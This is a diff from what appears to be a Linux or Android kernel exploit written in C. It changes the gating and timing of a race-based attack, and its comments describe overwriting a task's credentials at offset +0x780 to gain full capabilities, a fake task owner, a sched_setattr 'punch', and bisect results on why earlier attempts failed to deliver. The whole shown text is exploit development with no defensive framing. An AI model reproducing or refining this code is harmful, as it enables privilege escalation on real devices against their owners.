@@ -419,7 +419,13 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
                   (unsigned long long)g_main_pc,
                   (unsigned long long)g_main_left);
         }
-        if (env_flag("MODE4_CAPSONLY", 0) && g_child_cred) {
+        if (env_flag("MODE4_CC_DELIVERY", 0) &&
+            env_flag("MODE4_CAPSONLY", 0) && g_child_cred) {
+          /* BISECT GATE (5b9fd44 plan): MODE4_CC_DELIVERY=0 restores the
+           * OLD delivering shape — ghost words default (root-case), the
+           * delivery rides the W0.pi page channel (prerequeue erase
+           * 0x1ee3ac under owner=fake_task|1). CC=1 = the ghost
+           * main-tree change_child shape. */
           /* CAPSONLY v2: write task->cred (+0x780) = the CHILD's own
            * caps-cred copy (uid=2000 + full caps). The child pins its
            * page forever (polls own CapEff in MODE4_CAPS_CHILD), so the
@@ -2522,7 +2528,15 @@ void do_pselect_fake_lock_route(void) {
     if (env_flag("MODE4_NO_CONSUMER", 0)) {
     atomic_store(&punch_consume_go, 0);
       pr_info("pselect NO_CONSUMER=1 (no sched_setattr punch; survive-test)\n");
-    } else if (!env_flag("MODE4_JC2_SPINSTAMP", 0)) {
+    } else {
+      /* ARM EARLY (bisect result, jc45): the handoff (arm-after-spin)
+       * made the punch fire 60ms+ AFTER the last stamp — by then the
+       * blocking select's nested IRQ frames CLOBBERED the stale stamp
+       * → every walk read benign zeros → clean exit, no delivery
+       * (jc37-jc45). The old flow delivered because its punch hit a
+       * µs-fresh stamp MID-SPIN. Arm here; the spin refreshes until
+       * consumer_calls>0 (stop-on-calls) so the walk reads a fresh,
+       * complete stamp. Single-shot + heal + cap keep survival. */
       atomic_store(&punch_consume_go, route_attempt);
     }
     /* SPINSTAMP: the consumer is armed AFTER the spin's FINAL stamp (the
